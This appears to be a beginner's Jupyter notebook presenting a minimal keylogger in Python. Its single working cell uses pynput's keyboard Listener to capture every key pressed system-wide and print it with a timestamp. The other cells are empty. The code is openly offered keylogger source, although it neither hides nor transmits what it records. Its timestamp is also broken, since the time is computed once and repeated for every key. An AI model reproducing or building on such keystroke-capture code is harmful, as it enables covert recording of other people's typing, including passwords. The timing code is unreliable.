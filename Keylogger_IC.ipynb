{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "16bc6a5e-1055-4502-97d3-fd77a1e52043",
   "metadata": {},
   "source": [
    "Import from required libraries for using Keylogger"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7dde4b2f-4d2d-441a-947d-c7886f61c41d",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pynput.keyboard import  Listener # library for keyboard access\n",
    "import re, datetime\n",
    "from datetime import datetime # library used to post the time the key was pressed.\n",
    "now = datetime.now()\n",
    "\n",
    "def capturar(tecla):\n",
    "    tecla= str(tecla) # Access keyboard\n",
    "    tecla = re.sub(r'\\'','',tecla)\n",
    "    print(tecla) # Print key\n",
    "    print(now) # Print time\n",
    "with Listener(on_press=capturar) as l:\n",
    "           l.join() # Call the function "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c64ea1c4-5694-4e6b-9d10-3e467514bbec",
   "metadata": {},
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b93f2ac2-d1a4-467b-ae38-08e3d7035d15",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "180bca70-ba35-4643-a882-a8251c20bcc0",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "id": "d6ecfa9d-bdc3-461a-a27b-f997ecacf954",
   "metadata": {},
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "23381261-44f7-44ec-bb80-1d86fa4a345e",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "037faabc-d6ca-4c02-8a3b-c887b66f0f4c",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8dee798e-9106-497e-90a2-0299f02a7141",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "72af6bea-a4d4-412e-bebc-151016a28663",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "id": "9e551742-a2ab-4bb7-a3ce-31d5583cf1e7",
   "metadata": {},
   "source": [
    "# "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e6a621a6-0e9d-4c90-b512-f81d9540c49b",
   "metadata": {},
   "source": [
    "##### "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ffca2ec0-6962-4300-b9e9-0fa7c96427d4",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "458d3684-b013-4f4d-acb0-47a927ca4365",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "aa4de034-6828-4333-9d3f-8b3785e0f0cf",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.12"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
